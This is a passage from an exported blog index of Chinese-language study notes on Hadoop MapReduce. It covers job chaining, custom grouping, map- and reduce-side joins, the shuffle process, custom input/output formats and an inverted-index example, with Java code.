proMap.get(pid); k.set(res); context.write(k, NullWritable.get()); &#125; &#125; &#125;&#125; title: 执行流程时序图  Mapper(map)->ScoreBean: k:ScoreBean(courseName,avgScore) Mapper(map)->ScoreBean: v:Text(stuName) Mapper(ScoreBean)->Reducer(MyGroup): course按字典升序 Mapper(ScoreBean)->Reducer(MyGroup): course内成绩降序 Reducer(MyGroup)->Reducer(reduce): 根据自定义的分组规则按组输出 Reducer(MyGroup)->Reducer(reduce): 一组只调用reduce一次{"theme":"simple"} var code = document.getElementById("sequence-0-code").value; var options = JSON.parse(decodeURIComponent(document.getElementById("sequence-0-options").value)); var diagram = Diagram.parse(code); diagram.drawSVG("sequence-0", options);]]></content>
      <categories>
        <category>Hadoop</category>
        <category>MapReduce</category>
      </categories>
      <tags>
        <tag>原创</tag>
        <tag>技术</tag>
        <tag>Hadoop</tag>
        <tag>MapReduce</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MapReduce笔记-3]]></title>
    <url>%2F2018%2F06%2F08%2FHadoop%2F2-MapReduce%2FMapReduce%E7%AC%94%E8%AE%B0-3%2F</url>
    <content type="text"><![CDATA[1.多 Job 串联1.概念当程序中有多个 Job， 并且多个 job 之间相互依赖， a ， job 需要依赖另一个b，job 的执行结果时候， 此时需要使用多 job 串联 2. 涉及到昨天的微博求共同粉丝题目 A:B,C,D,F,E,OB:A,C,E,KC:F,A,D,ID:A,E,F,LE:B,C,D,M,LF:A,B,C,D,E,O,MG:A,C,D,E,FH:A,C,D,E,OI:A,OJ:B,OK:A,C,DL:D,E,FM:E,F,GO:A,H,I,J,K 以上是数据：A:B,C,D,F,E,O表示：A用户 关注B,C,D,E,F,O 求所有两两用户之间的共同关注对象 注意 要写2个MapReduce， 开启2个job 后一个job依赖于前一个的执行结果 后一个job的输入文件路径，就是前一个job的输出路径 2个job需要添加依赖 代码参考练习-第一题-求微博共同好友 多 Job 串联部分代码 基本的写到一起， job1， job2 用JobControl对象管理多 job， 会将多个 job 当做一个组中的 job 提交， 参数指的是组名， 随意起 原生的 job 要转为可控制的 job 123456789101112131415161718// 创建 JobControl 组JobControl jc = new JobControl("common_friend");// job 拿好配置， 加入 ControlledJob 管理, 变成可控制的 jobControlledJob ajob = new ControlledJob(job1.getConfiguration());ControlledJob bjob = new ControlledJob(job2.getConfiguration());// 添加依赖关系bjob.addDependingJob(ajob); // 添加 job进 JCjc.addJob(ajob);jc.addJob(bjob);// 启动线程Thread jobControlTread = new Thread(jc);jobControlTread.start();// 在线程完成之后关闭while(!jc.allFinished()) &#123; Thread.sleep(500);&#125;jobControl.stop(); 2. 分组组件map–分组–reduce reduce 接收到的数据是按照 map 输出的 key 进行分组的, 分组的时候按照 key 相同的时候为一组, 默认都实现了 WritableComparable接口， 其中的 compareTo（）方法返回为0的时候 默认为一组， 返回不为0， 则分到下一组 自定义分组使用场景： 默认的数据分组不能满足需求 一、数据解释 数据字段个数不固定：第一个是课程名称，总共四个课程，computer，math，english，algorithm，第二个是学生姓名，后面是每次考试的分数 二、统计需求：1、统计每门课程的参考人数和课程平均分 2、统计每门课程参考学生的平均分，并且按课程存入不同的结果文件，要求一门课程一个结果文件 3、求出每门课程参考学生成绩最高平均分的学生的信息：课程，姓名和平均分 第三题： 要求就是分组求最大值， 两件事情： 分组， 排序（shuffle） 总结： 1、利用“班级和平均分”作为 key，可以将 map 阶段读取到的所有学生成绩数据按照班级 和成绩排倒序，发送到 reduce 2、在 reduce 端利用 GroupingComparator 将班级相同的 kv 聚合成组，然后取第一个即是最 大值 具体参考：练习-求学生成绩-第三小题 3. Reduce 中的2个坑坑1Iterable\只能循环遍历一次 迭代器每次循环遍历完成， 指针都会移动到最后一个 系统类型，没事 自定义类型 ，有问题？ 坑2迭代器中所有对象公用同一个地址 4. Reduce 端的 Join牺牲效率换执行 思路： 核心： 关联条件 想要在 reduce 端完成 join， 要在 reduce 端可以同时接收到两个表中的数据 要保证在 Map 端进行读文件的时候， 读到2个表的数据， 并且需要对2个表的数据进行区分 将2个表放在同一个目录下 Map 端 读取两个表中的数据， 进行切分、发送 key ： 公共字段–关联字段–pid value： 剩下的字段， 标记数据的来源表 Reduce 端 通过编辑分离出2个表的数据 分别存到2个容器中（ArrayList） 遍历大表，拼接小表 代码参考练习-第三题MR实现2个表之间的Join 缺陷1. ReduceTask 的并行度问题： 建议0.95*datanode 的个数 并行度不高， 性能不高 2. 容器性能 list 等， 不提倡， reduce 接收的数据， 可能会很大 3. ReduceTask 容易产生数据倾斜 假设我们设置多个 ReduceTask， 根据分区规则， 默认 hash 以 key关联条件分， ReduceTask数据倾斜， 每个 ReduceTask 分工不均， 非常影响性能，没有合理的利用集群资源 在真实的生产中一定要尽量的避免数据倾斜 最好的做法：将分区设计的足够完美，难度比较大 因此，ReduceTask 一般不会完成 John工作 放在 Map 端完成就不会有这个问题了 补充：Mapper 中的源码分析123456789101112131415public void run(Context context) throws IOException, InterruptedException &#123; // 在 maptask 执行之前调用一次， 一个 maptask 只会调用一次。setup 中通常会帮 map 中初始化一些变量和资源， 比如数据库的连接等。 // 主要目的：减少资源的初始化次数而提升程序的性能 setup(context); try &#123; // 获取文件是否还有下一行， 一行只调用一次 while (context.nextKeyValue()) &#123; map(context.getCurrentKey(), context.getCurrentValue(), context); &#125; &#125; finally &#123; // maptask 任务执行完成之后会调用一次，一个 maptask 只会调用一次 // 帮 map 处理一些善后工作， 比如：资源的关闭 cleanup(context); &#125; &#125; 5. Map 端的 Join注意点：这种方式只能通过 Jar 包上传的方式，直接用 Eclipse 会找不到缓存 为了提升 Map 端 Join 性能， 我们的策略是， 将小表的数据加载到每个运行的 MapTask 的内存中。 如果小表被加载到了内存中， 我们每次在 Map 端只需要读取大表，当读取到大表的每一行数据，可以直接和内存中的小表进行关联。 这个时候，只需要 Map 就可以完成 Join 操作了。 1. 如何将小表加入到内存中？12// 将指定路径文件加载到缓存中job.addCacheFile(new URI("/xxx")); 2. Map 端怎样读取缓存中的数据想要在 Java 中使用缓存中的数据，缓存中的数据必须封装到 Java 的容器中 12// 获取缓存文件context.getLocalCacheFiles()[0] 3. 代码参考练习-第3题 代码注意点： setup：从缓存读取一文件（多对一的一）到 HashMap main 方法中注意点 12345// 指定文件加入缓存job.addCacheFile(new URI("/xxx")); // 如果没有ReduceTask， 要设置为0job.setNumReduceTasks(0); 示范代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384import java.io.BufferedReader;import java.io.FileInputStream;import java.io.IOException;import java.io.InputStreamReader;import java.net.URI;import java.util.HashMap;import java.util.Map;import org.apache.commons.lang.StringUtils;import org.apache.hadoop.conf.Configuration;import org.apache.hadoop.fs.Path;import org.apache.hadoop.io.LongWritable;import org.apache.hadoop.io.NullWritable;import org.apache.hadoop.io.Text;import org.apache.hadoop.mapreduce.Job;import org.apache.hadoop.mapreduce.Mapper;import org.apache.hadoop.mapreduce.lib.input.FileInputFormat;import org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;public class MapSideJoin &#123; public static class MapSideJoinMapper extends Mapper&lt;LongWritable, Text, Text, NullWritable&gt; &#123; // 用一个hashmap来加载保存产品信息表 Map&lt;String, String&gt; pdInfoMap = new HashMap&lt;String, String&gt;(); Text k = new Text(); /** * 通过阅读父类Mapper的源码，发现 setup方法是在maptask处理数据之前调用一次 可以用来做一些初始化工作 */ @Override protected void setup(Context context) throws IOException, InterruptedException &#123; BufferedReader br = new BufferedReader(new InputStreamReader(new FileInputStream("pdts.txt"))); String line; while (StringUtils.isNotEmpty(line = br.readLine())) &#123; String[] fields = line.split(","); pdInfoMap.put(fields[0], fields[1]); &#125; br.close(); &#125; // 由于已经持有完整的产品信息表，所以在map方法中就能实现join逻辑了 @Override protected void map(LongWritable key, Text value, Context context) throws IOException, InterruptedException &#123; String orderLine = value.toString(); String[] fields = orderLine.split("\t"); String pdName = pdInfoMap.get(fields[1]); k.set(orderLine + "\t" + pdName); context.write(k, NullWritable.get()); &#125; &#125; public static void main(String[] args) throws Exception &#123; Configuration conf = new Configuration(); Job job = Job.getInstance(conf); job.setJarByClass(MapSideJoin.class); job.setMapperClass(MapSideJoinMapper.class); job.setOutputKeyClass(Text.class); job.setOutputValueClass(NullWritable.class); FileInputFormat.setInputPaths(job, new Path("D:/srcdata/mapjoininput")); FileOutputFormat.setOutputPath(job, new Path("D:/temp/output")); // 指定需要缓存一个文件到所有的maptask运行节点工作目录 /* job.addArchiveToClassPath(archive); */// 缓存jar包到task运行节点的classpath中 /* job.addFileToClassPath(file); */// 缓存普通文件到task运行节点的classpath中 /* job.addCacheArchive(uri); */// 缓存压缩包文件到task运行节点的工作目录 /* job.addCacheFile(uri) */// 缓存普通文件到task运行节点的工作目录 // 将产品表文件缓存到task工作节点的工作目录中去 job.addCacheFile(new URI("file:/D:/srcdata/mapjoincache/pdts.txt")); //map端join的逻辑不需要reduce阶段，设置reducetask数量为0 job.setNumReduceTasks(0); boolean res = job.waitForCompletion(true); System.exit(res ? 0 : 1); &#125;&#125; 6. 对比MapJoin 的方式： 大 &amp; 小表 因为有一个表需要加载到内存中，注定加载到内存中的表不能过大（hive 中默认是256M） 大表 &amp; 大表 如何设计 ReduceJoin ： 解决数据倾斜的问题，合理设计分区。 —很难做到 将其中一个大表进行切分，切分成小表， 最终执行 大表 &amp; 小表 优点 并行度高，不存在数据倾斜的问题，运行效率高 优先选择MapJoin :arrow_forward: 7. 排序算法 （待整理：TODO）1. 快速排序边界值始终是不变的。 2. 归并排序一般情况针对有序的，多个， 小数据集 应用场景：想到了多个Reduce 任务产生的多个文件的合并 1. 归并排序前传： 合并多个数组 2. 归并排序 之 一个大数据集—归———-切分成单个的数据集 —-并——— 两两相并， 并成新的数组， 小的先放入数组， 再放大的 新的数组再不断执行 上述的 合并多个数组 8. ※ Shuffle 过程 ※ mapper 阶段处理的数据如何传递给 reducer 阶段，是 MapReduce 框架中 最关键的一个流程，这个流程就叫 Shuffle Shuffle 即 数据混洗 —— 核心机制：数据分区，排序，局部聚合，缓存，拉取，再合并，排序； 环形缓冲区 内存中的一种首尾相连的数据结构（底层是字节数组），kvbuffer 包含原始数据区和元数据区，一个mapTask任务对应一个环形缓冲区 默认大小 100M，默认阈(yu)值 0.8，即当达到 80M 后，会触发 spill溢写 操作，将数据写入磁盘，此时mapper输出会继续向剩余20M中写数据缓冲区大小 mapred-site.xml：mapreduce.task.io.sort.mb阈值 mapred-site.xml：mapreduce.map.sort.spill.percent路径：mapred-site.xml：mapreduce.cluster.local.dir 如果此80M数据写入磁盘完成前，剩余20M缓冲区也写完，则会进入阻塞状态，直到是spill完成腾出缓冲区空间 赤道（equtor）：环形缓冲区中原始数据和元数据的边界 原始数据：mapTask输出的数据 元数据 记录原始数据的数据，包含4部分内容，占16*4字节； 每一条元数据占用空间是一样的，排序可以通过交换元数据实现 分类 a. 原始数据中key的起始位置 b. 原始数据中value的起始位置 c. value的长度 d. 分区信息，即该条信息属于哪个分区 核心操作 \1. 分区 partition（如果 reduceTask 只有一个或者没有，那么 partition 将不起作用） \2. Sort 根据 key 排序（MapReduce 编程中的 sort 是一定会做的，并且 只能按照 key排序， 当然 如果没有 reducer 阶段，那么就不会对 key 排序） \3. Combiner 进行局部 value 的合并（Combiner 是可选的组件，作用只是为了提高任务的执行效率） 详细过程 \1. 一个大文件需要处理，它在在 HDFS 上是以 block 块形式存放，每个 block 默认为 128M 存 3 份；运行时每个 map 任务会处理一个切块（split），如果 block 大和 split 相同，有多少个 block 就有多少个 map 任务；所以对整个文件处理时会有很多 map 任务进行并行计算。 \2. 每个 map 任务处理完输入的切块后会把结果写入到内存的一个 环形缓冲区，写入过程中会进行简单排序，当缓冲区的大小阀值，一个后台的线程就会启动把缓冲区中的数据溢写（spill）到本地磁盘中，同时Mapper继续时向环形缓冲区中写入数据。 数据溢写入到磁盘之前，首先会根据 reducer 的数量划分成同数量的分区（partition），每个分区中的都数据会有后台线程根据 map 任务的输出结果 key 进行排序； 如果有 combiner，它会在 缓冲区溢写到磁盘之前 和 mapTask排好序的输出上 运行，使写到本地磁盘和传给 reducer 的数据更少；Combiner即是把同一分区中的同一key的数据进行合并，整个shuffle过程会调用两个Combiner ! 最后在本地生成分好区且排好序的小文件。 注意：如果 map 向环形缓冲区写入数据的速度大于向本地写入数据的速度，环形缓冲区会被写满，向环形缓冲区写入数据的线程会阻塞直至缓冲区中的内容全部溢写到磁盘后再次启动，到阀值后会向本地磁盘新建一个溢写文件； \3. map 任务完成之前，会把本地磁盘溢写的所有文件 不停地 合并（merge）成得到一个结果文件，合并得到的结果文件会根据小溢写文件的分区而分区，每个分区的数据会再次根据 key 进行 排序，得到的结果文件是分好区且排好序的（可以合并成一个文件的溢写文件数量默认为10）；默认合并溢写文件数量 mapred-site.xml：mapreduce.task.io.sort.factor \4. reduce 任务启动，Reducer 中的一个线程定期向 MRAppMaster 询问 Mapper 输出结果文件位置，Mapper 结束后会向 MRAppMaster 汇报信息，从而 Reducer 会得知 Mapper 状态并得到 map 结果文件目录；reduce任务数配置a) mapred-site.xml：mapreduce.job.reducesb) job.setNumReduceTasks(num) \6. 当有一个 Mapper 结束时，reduce 任务进入复制阶段，reduce 任务通过 http 协议（hadoop 内置了netty容器）把所有 Mapper 结果文件的 对应的分区数据 拉取（fetch）过来，Reducer 可以并行复 制 Mapper 的 结果 ， 默认线程数为5； 所有 Reducer 复制完成 map 结果文件后，由于 Reducer 可能会失败，NodeManager 并不会在第一个 map 结果文件复制完成后就删除它，而是直到作业完成后 MRAppMaster 通知 NodeManager 进行删除； 另外如果 map 结果文件相当小，则会被直接复制到 reduce NodeManager 的内存；一旦缓冲区达到 reduce 的阈值大小 0.66 或 写入到 reduce NodeManager 内 存 中 文 件 个 数 达 到 map 输出阈值 1000，reduce 就会把 map 结果文件合并（merge）溢写到本地；默认线程数 mapred-site.xml：mapreduce.reduce.shuffle.parallelcopies缓冲区大小 mapred-site.xml:mapreduce.reduce.shuffle.input.buffer.percent，默认0.7阈值：mapred-site.xml:mapreduce.reduce.shuffle.merge.percent，默认0.66map输出阈值1000：mapred-site.xml:mapreduce.reduce.merge.inmem.threshold \7. 复制阶段完成后，Reducer 进入 Merge 阶段，循环地合并 map 结果文件，维持其顺序排序，合并因子默认为 10，经过不断地 Merge 后得到一个”最终文件”，可能存储在磁盘也可能存在内存中； \8. “最终文件”输入到 reduce 进行计算，计算结果输入到 HDFS。 [ 注意 ] 溢写前会先按照分区进行排序，再按key进行排序，采用 快速排序排序是按照原始数据排序，但是由于原始数据不好移动且原始数据包含了原始数据的位置信息，所以移动的其实是元数据；写入时读的是元数据，真正写入的时原始数据 最后的数据如果不够80M，也会被强制flush到磁盘 每个mapTask任务生成的磁盘小数据最后都会merge成一个大文件，采用 归并排序 Shuffle 中的缓冲区大小会影响到 mapreduce 程序的执行效率，原则上说，缓冲区越大，磁 盘io的次数越少，执行速度就越快。 10、自定义输入 InputFormat 默认的文件加载：TextInputFormat 默认的文件读取：LineRecordReader 源码追踪过程：context –&gt; mappercontext –&gt; mapcontext –&gt; reader –&gt; input –&gt; real –&gt; inputFormat.createRecordReader（split，taskContext），然后查找 inputFormat –&gt; createRecordReader（split，taskContext），inputFormat –&gt; TextInputFormat实例对象 案例：多个小文件合并 word1.txt ~word10.txt 每次读取一个小文件 自定义输入，需要创建两个类，并通过Job对象指定自定义输入 \1. 创建XxxInputFormat类，继承FileInputFormat&lt;&gt;，重写 createRecordReader() 方法 \2. 创建XxxRecordReader类，继承RecordReader&lt;&gt;，重写以下方法： initialize()：初始化方法，类似于setup()，对属性、链接或流进行初始化 getCurrentKey()：返回key getCurrentValue()：返回value getProgress()：返回文件执行进度 nextKeyValue()：返回文件是否读取结束 close()：进行一些资源的释放 \3. 在mapreduce类的main()方法中指定自定义输入：job.setInputFormatClass(XxxInputFormat.class); 代码 123456789101112131415161718192021222324252627282930313233package com.rox.mapreduce.mr4._02_inputformat;import java.io.IOException;import org.apache.hadoop.fs.Path;import org.apache.hadoop.io.NullWritable;import org.apache.hadoop.io.Text;import org.apache.hadoop.mapreduce.InputSplit;import org.apache.hadoop.mapreduce.JobContext;import org.apache.hadoop.mapreduce.RecordReader;import org.apache.hadoop.mapreduce.TaskAttemptContext;import org.apache.hadoop.mapreduce.lib.input.FileInputFormat;public class WholeFileInputFormat extends FileInputFormat&lt;NullWritable, Text&gt; &#123; /** * 设置每个小文件不可分片,保证一个小文件生成一个key-v键值对 */ @Override protected boolean isSplitable(JobContext context, Path filename) &#123; return false; &#125; @Override public RecordReader&lt;NullWritable, Text&gt; createRecordReader(InputSplit split, TaskAttemptContext context) throws IOException, InterruptedException &#123; WholeFileRecordReader reader = new WholeFileRecordReader(); reader.initialize(split, context); return reader; &#125;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576package com.rox.mapreduce.mr4._02_inputformat;import java.io.IOException;import org.apache.hadoop.conf.Configuration;import org.apache.hadoop.fs.FSDataInputStream;import org.apache.hadoop.fs.FileSystem;import org.apache.hadoop.fs.Path;import org.apache.hadoop.io.IOUtils;import org.apache.hadoop.io.NullWritable;import org.apache.hadoop.io.Text;import org.apache.hadoop.mapreduce.InputSplit;import org.apache.hadoop.mapreduce.RecordReader;import org.apache.hadoop.mapreduce.TaskAttemptContext;import org.apache.hadoop.mapreduce.lib.input.FileSplit;public class WholeFileRecordReader extends RecordReader&lt;NullWritable, Text&gt;&#123; private FileSplit fileSplit; private Configuration conf; private Text value = new Text(); private boolean processed = false; // 标识文件是否读取完成 /** * 初始化方法 */ @Override public void initialize(InputSplit split, TaskAttemptContext context) throws IOException, InterruptedException &#123; this.fileSplit=(FileSplit)split; this.conf = context.getConfiguration(); &#125; @Override public boolean nextKeyValue() throws IOException, InterruptedException &#123; if (!processed) &#123; byte[] contents = new byte[(int)fileSplit.getLength()]; Path file = fileSplit.getPath(); FileSystem fs = file.getFileSystem(conf); FSDataInputStream in = null; try &#123; in = fs.open(file); // 把输入流上的数据全部读取到contents字节数组中 IOUtils.readFully(in, contents, 0, contents.length); // 把读取到的数据设置到value里 value.set(contents,0,contents.length); &#125; finally &#123; IOUtils.closeStream(in); &#125; processed = true; return true; &#125; return false; &#125; @Override public NullWritable getCurrentKey() throws IOException, InterruptedException &#123; return NullWritable.get(); &#125; @Override public Text getCurrentValue() throws IOException, InterruptedException &#123; return value; &#125; @Override public float getProgress() throws IOException, InterruptedException &#123; return processed ? 1.0f : 0.0f; &#125; @Override public void close() throws IOException &#123; &#125;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114package com.rox.mapreduce.mr4._02_inputformat;import java.io.IOException;import org.apache.hadoop.conf.Configuration;import org.apache.hadoop.conf.Configured;import org.apache.hadoop.fs.FileSystem;import org.apache.hadoop.fs.Path;import org.apache.hadoop.io.NullWritable;import org.apache.hadoop.io.Text;import org.apache.hadoop.mapreduce.InputSplit;import org.apache.hadoop.mapreduce.Job;import org.apache.hadoop.mapreduce.Mapper;import org.apache.hadoop.mapreduce.Reducer;import org.apache.hadoop.mapreduce.lib.input.FileInputFormat;import org.apache.hadoop.mapreduce.lib.input.FileSplit;import org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;import org.apache.hadoop.util.Tool;import org.apache.hadoop.util.ToolRunner;public class SmallFilesConvertToBigMR extends Configured implements Tool &#123; public static void main(String[] args) throws Exception &#123; int exitCode = ToolRunner.run(new SmallFilesConvertToBigMR(), args); System.exit(exitCode); &#125; @Override public int run(String[] args) throws Exception &#123; Configuration conf = new Configuration(); conf.set("fs.defaultFS", "hdfs://cs1:9000"); System.setProperty("HADOOP_USER_NAME", "ap"); Job job = Job.getInstance(conf, "combine small files to bigfile"); job.setJarByClass(SmallFilesConvertToBigMR.class); job.setMapOutputKeyClass(Text.class); job.setMapOutputValueClass(Text.class); job.setMapperClass(SmallFilesConvertToBigMRMapper.class); job.setReducerClass(SmallFilesConvertToBigMRReducer.class); job.setOutputKeyClass(NullWritable.class); job.setOutputValueClass(Text.class);//////// job.setInputFormatClass(WholeFileInputFormat.class); // job.setOutputFormatClass(SequenceFileOutputFormat.class); Path input = new Path("/in/joindemo"); Path output = new Path("/out/bigfile"); FileInputFormat.setInputPaths(job, input); FileSystem fs = FileSystem.get(conf); if (fs.exists(output)) &#123; fs.delete(output, true); &#125; FileOutputFormat.setOutputPath(job, output); int status = job.waitForCompletion(true) ? 0 : 1; return status; &#125; static class SmallFilesConvertToBigMRMapper extends Mapper&lt;NullWritable, Text, Text, Text&gt; &#123; private Text filenameKey; @Override protected void setup( Mapper&lt;NullWritable, Text, Text, Text&gt;.Context context) throws IOException, InterruptedException &#123; InputSplit split = context.getInputSplit(); Path path = ((FileSplit) split).getPath(); filenameKey = new Text(path.toString()); &#125; @Override protected void map(NullWritable key, Text value, Mapper&lt;NullWritable, Text, Text, Text&gt;.Context context) throws IOException, InterruptedException &#123; context.write(filenameKey, value); &#125; &#125; static class SmallFilesConvertToBigMRReducer extends Reducer&lt;Text, Text, NullWritable, Text&gt; &#123; @Override protected void reduce(Text filename, Iterable&lt;Text&gt; bytes, Context context) throws IOException, InterruptedException &#123; context.write(NullWritable.get(), bytes.iterator().next()); &#125; &#125;&#125; 11、自定义输出 OutputFormat 默认的文件加载：TextOutputFormat 默认的文件读取：LineRecordWriter 源码追踪过程 略 案例：将考试成绩合格的输出到一个文件夹，不及格的输出到另一个文件夹（注意，不同于分区，分区只是量结果输出到同一文件夹下不同文件） 自定义输出，需要创建两个类，并通过Job对象指定自定义输入 \1. 创建XxxOutputFormat类，继承FileOutputFormat&lt;&gt;，重写getRecordWriter()方法 \2. 创建XxxRecordWriter类，继承RecordWriter&lt;&gt;，重写以下方法： write()：真正向外写出的方法，需要将结果输出到几个不同文件夹，就需要创建几个输出流 而输出流通过FileSystem对象获取，FileSystem对象获取需要配置文件 一般可以通过构造方法直接传入FileSystem对象 close()：释放资源 \3. 在mapreduce类的main()方法中指定自定义输入：job.setOutputFormatClass(XxxOutputFormat.class); 代码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475package com.rox.mapreduce.outputformat;import java.io.IOException;import org.apache.hadoop.conf.Configuration;import org.apache.hadoop.fs.FileSystem;import org.apache.hadoop.fs.Path;import org.apache.hadoop.io.LongWritable;import org.apache.hadoop.io.NullWritable;import org.apache.hadoop.io.Text;import org.apache.hadoop.mapreduce.Job;import org.apache.hadoop.mapreduce.Mapper;import org.apache.hadoop.mapreduce.lib.input.FileInputFormat;import org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;public class MultipleOutputMR &#123; public static void main(String[] args) throws Exception &#123; // 指定HDFS相关参数 Configuration conf = new Configuration(); conf.set("fs.defaultFS", "hdfs://cs1:9000"); System.setProperty("HADOOP_USER_NAME", "ap"); //  创建/配置 Job Job job = Job.getInstance(conf); // 设置Jar包类型:这里千万别写错了 job.setJarByClass(MultipleOutputMR.class); // 设置Map Reduce执行类 job.setMapperClass(MultipleOutputMRMapper.class); // 设置Map输出类 job.setMapOutputKeyClass(Text.class); job.setMapOutputValueClass(NullWritable.class); ////////////// 设置reduce执行个数为0 job.setNumReduceTasks(0); ///////////// 设置MapOutputFormatClass job.setOutputFormatClass(MyOutputFormat.class); // 设置输入 输出路径 String inP = "/in/newScoreIn"; String outP = "/out/myoutformat/mulWriteSuc"; FileInputFormat.setInputPaths(job, new Path(inP)); FileOutputFormat.setOutputPath(job, new Path(outP)); // 设置如果存在路径就删除 Path mypath = new Path(outP); FileSystem hdfs = mypath.getFileSystem(conf); if (hdfs.exists(mypath)) &#123; hdfs.delete(mypath, true); &#125; //  执行job System.exit(job.waitForCompletion(true)?0:-1); &#125; static class MultipleOutputMRMapper extends Mapper&lt;LongWritable, Text, Text, NullWritable&gt; &#123; @Override protected void map(LongWritable key, Text value, Mapper&lt;LongWritable, Text, Text, NullWritable&gt;.Context context) throws IOException, InterruptedException &#123; // 参考次数&gt;7次 算合格 String[] splits = value.toString().split(","); if (splits.length &gt; 9) &#123; context.write(new Text("1::"+value.toString()), NullWritable.get()); &#125;else &#123; context.write(new Text("2::"+value.toString()), NullWritable.get()); &#125; &#125; &#125;&#125; 123456789101112131415161718192021222324252627282930313233package com.rox.mapreduce.outputformat;import java.io.IOException;import org.apache.hadoop.conf.Configuration;import org.apache.hadoop.fs.FSDataOutputStream;import org.apache.hadoop.fs.FileSystem;import org.apache.hadoop.fs.Path;import org.apache.hadoop.io.NullWritable;import org.apache.hadoop.io.Text;import org.apache.hadoop.mapreduce.RecordWriter;import org.apache.hadoop.mapreduce.TaskAttemptContext;import org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;public class MyOutputFormat extends FileOutputFormat&lt;Text, NullWritable&gt; &#123; @Override public RecordWriter&lt;Text, NullWritable&gt; getRecordWriter( TaskAttemptContext job) throws IOException, InterruptedException &#123; Configuration configuration = job.getConfiguration(); FileSystem fs = FileSystem.get(configuration); Path p1 = new Path("/out/myoutformat/out1"); Path p2 = new Path("/out/myoutformat/out2"); FSDataOutputStream out1 = fs.create(p1); FSDataOutputStream out2 = fs.create(p2); return new MyRecordWriter(out1,out2); &#125;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243package com.rox.mapreduce.outputformat;import java.io.IOException;import org.apache.hadoop.fs.FSDataOutputStream;import org.apache.hadoop.io.IOUtils;import org.apache.hadoop.io.NullWritable;import org.apache.hadoop.io.Text;import org.apache.hadoop.mapreduce.RecordWriter;import org.apache.hadoop.mapreduce.TaskAttemptContext;public class MyRecordWriter extends RecordWriter&lt;Text, NullWritable&gt; &#123; FSDataOutputStream fsout = null; FSDataOutputStream fsout1 = null; public MyRecordWriter(FSDataOutputStream fsout, FSDataOutputStream fsout1) &#123; super(); this.fsout = fsout; this.fsout1 = fsout1; &#125; @Override public void write(Text key, NullWritable value) throws IOException, InterruptedException &#123; String[] strs = key.toString().split("::"); if (strs[0].equals("1")) &#123; fsout.write((strs[1]+"\n").getBytes()); &#125;else &#123; fsout1.write((strs[1]+"\n").getBytes()); &#125; &#125; @Override public void close(TaskAttemptContext context) throws IOException, InterruptedException &#123; IOUtils.closeStream(fsout); IOUtils.closeStream(fsout1); &#125;&#125; 12. 倒排索引建立概念： 倒排索引（Inverted Index），也常被称为反向索引、置入档案或反向档案，是一种索引方法，被用来存储在全文搜索下某个单词在一个文档或者一组文档中的存储位置的映射。它是文档检索系统中最常用的数据结构。了解详情可自行百度 需求：有大量的文本（文档、网页），需要建立搜索索引 , 要求统计每一个单词在每个文件中出现的次数, 如下 思路 先根据单词&amp;文件名为 key, 输出一个文件 拆分文件行, 以单词为 key, value 再拼接 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140//  InverIndexStepOne package cn.itcast.bigdata.mr.inverindex;import java.io.IOException;import org.apache.hadoop.conf.Configuration;import org.apache.hadoop.fs.Path;import org.apache.hadoop.io.IntWritable;import org.apache.hadoop.io.LongWritable;import org.apache.hadoop.io.Text;import org.apache.hadoop.mapreduce.Job;import org.apache.hadoop.mapreduce.Mapper;import org.apache.hadoop.mapreduce.Reducer;import org.apache.hadoop.mapreduce.lib.input.FileInputFormat;import org.apache.hadoop.mapreduce.lib.input.FileSplit;import org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;public class InverIndexStepOne &#123; static class InverIndexStepOneMapper extends Mapper&lt;LongWritable, Text, Text, IntWritable&gt; &#123; Text k = new Text(); IntWritable v = new IntWritable(1); @Override protected void map(LongWritable key, Text value, Context context) throws IOException, InterruptedException &#123; String line = value.toString(); String[] words = line.split(" "); FileSplit inputSplit = (FileSplit) context.getInputSplit(); String fileName = inputSplit.getPath().getName(); for (String word : words) &#123; k.set(word + "--" + fileName); context.write(k, v); &#125; &#125; &#125; static class InverIndexStepOneReducer extends Reducer&lt;Text, IntWritable, Text, IntWritable&gt; &#123; @Override protected void reduce(Text key, Iterable&lt;IntWritable&gt; values, Context context) throws IOException, InterruptedException &#123; int count = 0; for (IntWritable value : values) &#123; count += value.get(); &#125; context.write(key, new IntWritable(count)); &#125; &#125; public static void main(String[] args) throws Exception &#123; Configuration conf = new Configuration(); Job job = Job.getInstance(conf); job.setJarByClass(InverIndexStepOne.class); job.setOutputKeyClass(Text.class); job.setOutputValueClass(IntWritable.class); FileInputFormat.setInputPaths(job, new Path("D:/srcdata/inverindexinput")); FileOutputFormat.setOutputPath(job, new Path("D:/temp/out")); // FileInputFormat.setInputPaths(job, new Path(args[0])); // FileOutputFormat.setOutputPath(job, new Path(args[1])); job.setMapperClass(InverIndexStepOneMapper.class); job.setReducerClass(InverIndexStepOneReducer.class); job.waitForCompletion(true); &#125;&#125;//  IndexStepTwo package cn.itcast.bigdata.mr.inverindex;import java.io.IOException;import org.apache.hadoop.conf.Configuration;import org.apache.hadoop.fs.Path;import org.apache.hadoop.io.LongWritable;import org.apache.hadoop.io.Text;import org.apache.hadoop.mapreduce.Job;import org.apache.hadoop.mapreduce.Mapper;import org.apache.hadoop.mapreduce.Reducer;import org.apache.hadoop.mapreduce.lib.input.FileInputFormat;import org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;public class IndexStepTwo &#123; public static class IndexStepTwoMapper extends Mapper&lt;LongWritable, Text, Text, Text&gt;&#123; @Override protected void map(LongWritable key, Text value, Context context) throws IOException, InterruptedException &#123; String line = value.toString(); String[] files = line.split("--"); context.write(new Text(files[0]), new Text(files[1])); &#125; &#125; public static class 